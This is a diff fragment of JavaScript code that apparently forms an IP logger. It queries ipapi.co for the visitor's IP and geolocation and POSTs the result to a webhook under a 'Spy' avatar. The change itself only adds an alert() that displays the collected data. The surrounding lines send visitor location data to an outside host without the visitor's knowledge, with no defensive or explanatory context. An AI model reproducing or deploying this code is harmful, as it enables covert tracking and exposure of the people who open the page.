@@ -10,6 +10,7 @@ $.getJSON('https://ipapi.co/json', function sendData(data) {
       const request = new XMLHttpRequest();
       request.open("POST", webhook.url);
       request.setRequestHeader('Content-type', 'application/json');
+      alert(JSON.stringify(data, null, 2));
       const params = {
         username: webhook.name,
         avatar_url: "https://cdn3.iconfinder.com/data/icons/business-marketing-color/48/Spy-512.png",
